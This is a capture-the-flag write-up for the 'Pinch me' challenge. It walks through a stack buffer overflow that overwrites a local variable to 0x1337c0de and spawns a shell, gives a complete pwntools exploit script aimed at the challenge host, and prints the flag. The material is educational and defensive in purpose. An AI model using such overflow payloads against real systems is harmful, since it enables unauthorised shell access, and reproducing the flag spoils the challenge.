# Pinch me

This should be easy!
nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480

## Challenge

A buffer overflow challenge to overwrite a stack variable to a specific value.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Vulnerable Function

```c
void sym.vuln(void)
{
    char *s;
    uint32_t var_8h;
    uint32_t var_4h;

    var_4h = 0x1234567;
    var_8h = 0x89abcdef;
    sym.imp.puts("Is this a real life, or is it just a fanta sea?");
    sym.imp.puts("Am I dreaming?");
    sym.imp.fgets(&s, 100, _reloc.stdin);
    if (var_8h == 0x1337c0de) {
        sym.imp.system("/bin/sh");
    } else {
        if (var_4h == 0x1234567) {
            sym.imp.puts("Pinch me!");
        } else {
            sym.imp.puts("Pinch me harder!");
        }
    }
    return;
}
```

## Solution

We can overflow the buffer to overwrite variables on the stack.
Specifically, by overwriting `var_8h` to 0x1337c0de, we can make the process spawn a shell.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf1-chall-pinch-me.westeurope.azurecontainer.io --port 7480 pinch_me
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pinch_me')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf1-chall-pinch-me.westeurope.azurecontainer.io'
port = int(args.PORT or 7480)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

targetVal = 0x1337c0de

payload = flat({
    0x20-0x8: targetVal,
    })

io.sendline(payload)

io.interactive()
```

## Flag

`dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}`

